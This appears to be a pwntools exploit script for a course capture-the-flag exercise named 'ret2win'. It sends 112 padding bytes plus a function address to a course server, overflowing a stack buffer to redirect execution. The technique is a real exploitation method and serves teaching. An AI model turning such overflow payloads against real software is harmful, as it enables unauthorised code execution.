#!/usr/bin/env python3

from pwn import *

local = False

if local:
    r = process('./ret2win')
else:
    r = remote('tpas.alunos.dcc.fc.up.pt', 5001)

s = r.recvuntil('> ')

r.sendline('1')  # string length
s = r.recvuntil('Give me a string: ')

n = 112

win_function = p32(0x804863d) # run 'p32 win' in GDB

payload = b'A' * n + win_function

r.sendline(payload)

r.interactive()
